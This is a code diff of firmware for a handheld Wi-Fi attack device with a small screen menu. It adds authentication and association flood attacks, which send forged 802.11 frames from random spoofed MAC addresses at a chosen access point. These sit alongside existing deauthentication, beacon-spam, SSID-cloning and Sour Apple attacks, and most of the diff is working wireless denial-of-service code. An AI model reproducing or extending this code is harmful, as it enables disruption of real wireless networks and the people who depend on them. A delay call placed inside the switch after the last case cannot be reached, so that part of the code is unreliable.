@@ -379,6 +379,7 @@ void becaon(int state){
   while(!becaon_break_flag){
     RuningProgressBar();
     display.display();
+    if(ButtonPress(btnBack)) becaon_break_flag = true;
     switch (state) {
       case 0: {
         for(int i=0;i<6;i++){
@@ -387,9 +388,7 @@ void becaon(int state){
         }
         int randomIndex = random(0,19);
         int randomChannel = allChannels[randomIndex];
-
-        wext_set_channel(WLAN0_NAME,randomChannel);
-        if(ButtonPress(btnBack)) becaon_break_flag = true;
+        wext_set_channel(WLAN0_NAME,randomChannel);      
         String spamssid = generateRandomString(10);
         for (int j = 0; j<max_spam_space; j++){
           spamssid += " ";
@@ -400,9 +399,7 @@ void becaon(int state){
         }
         break;
       }
-
-      case 1: {
-        if(ButtonPress(btnBack)) becaon_break_flag = true;
+      case 1: {       
         for (int i = 0 ; i < SelectedItem.size(); i++){
           int idx = SelectedItem[i];
           String clonessid = scan_results[idx].ssid;
@@ -416,7 +413,7 @@ void becaon(int state){
         }
         break;
       }
-    } 
+    }
   } 
 }
 
@@ -1046,6 +1043,72 @@ void selection_handdler(std::vector<String>& menu_name_handle, int menu_func_sta
     }
   }
 }
+
+void random_mac(uint8_t *mac) {
+  for (int i = 0; i < 6; i++) mac[i] = random(0x00, 0xFF);
+  mac[0] = (mac[0] & 0xFE) | 0x02;
+}
+bool assoc_flag = true;
+
+
+void flood(const uint8_t* bssid, const char* ssid, uint32_t count, uint16_t delay_ms,int state){
+  uint8_t random_src[6];
+  for (uint32_t i = 0; i < count; i++) {
+    if(ButtonPress(btnBack)) {
+      assoc_flag = false;
+      break;
+    }
+    random_mac(random_src);
+    uint16_t seq = i & 0xFFF;
+    switch(state){
+      case 0:
+        break;
+      case 1:
+        wifi_tx_assoc_frame(random_src, (void*)bssid, ssid, seq);
+        break;
+      case 2:
+        break;
+      case 3:
+        wifi_tx_auth_frame(random_src, (void*)bssid, seq);
+        break;
+    if (delay_ms) delay(delay_ms);
+    }
+  }
+}
+void auth_assoc(int state){
+  assoc_flag = true;
+  if(SelectedItem.size() == 1){
+    while(assoc_flag){
+      RuningProgressBar();
+      display.display();
+      int idx = SelectedItem[0];
+      int ch = scan_results[idx].channel;
+      String SSID = scan_results[idx].ssid;
+      wext_set_channel(WLAN0_NAME,ch);
+      memcpy(deauth_bssid,scan_results[idx].bssid,6);
+      switch(state){
+        case 0:{
+          if( ch > 14){
+            display.clearDisplay();
+            showPopup("5Ghz Not Support");
+            assoc_flag = false;
+          }
+          flood(deauth_bssid,SSID.c_str(),100,2,1);
+          break;
+        }
+        case 1:{
+          flood(deauth_bssid,SSID.c_str(),100,2,3);
+          break;
+        }
+      }
+
+    }
+  }
+  else{
+    display.clearDisplay();
+    showPopup("Please select one ssid for performance");
+  }
+}
 void AT_draw_func(int state){
   display_init();
   deauth_break_flag = false;
@@ -1081,18 +1144,23 @@ void AT_draw_func(int state){
     const int cx = 110, cy = 26, r = 5;
     display.fillCircle(cx, cy, r, WHITE);
     display.drawCircle(cx, cy, r, WHITE); 
-
-    display.display();
-    // display.setCursor(15,25);
-    // RuningProgressBar();
     display.display();
     if (SelectedItem.size() == 0) SelectedItem.push_back(0);
     if (at_names[state] == "Deauth") deauth(0);
-    if (at_names[state] == "All Deauth") deauth(1); //if(!deauth_break_flag) 에러시 추가
+    if (at_names[state] == "All Deauth") deauth(1);
     if(at_names[state] == "Sour Apple"){
       SourApple();
       break;
     }
+    if(at_names[state] == "Association"){
+      auth_assoc(0);
+      break;
+    }
+    if(at_names[state] == "Authentication"){
+      auth_assoc(1);
+      break;
+    }
+
     if(deauth_break_flag){
       //selected_menu = state;
       draw_menu(at_names, selected_menu);
@@ -1116,7 +1184,7 @@ void setup() {
   display.setCursor(0, 0);
   display.display();
   main_names = {"Attack", "Scan", "Select","Settings"};
-  at_names = {"Deauth", "All Deauth","Becaon","Evil Twin","Sour Apple"};
+  at_names = {"Deauth", "All Deauth","Becaon","Authentication","Association","Evil Twin","Sour Apple"};
   Serial.println("done");
   DEBUG_SER_INIT();
   WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
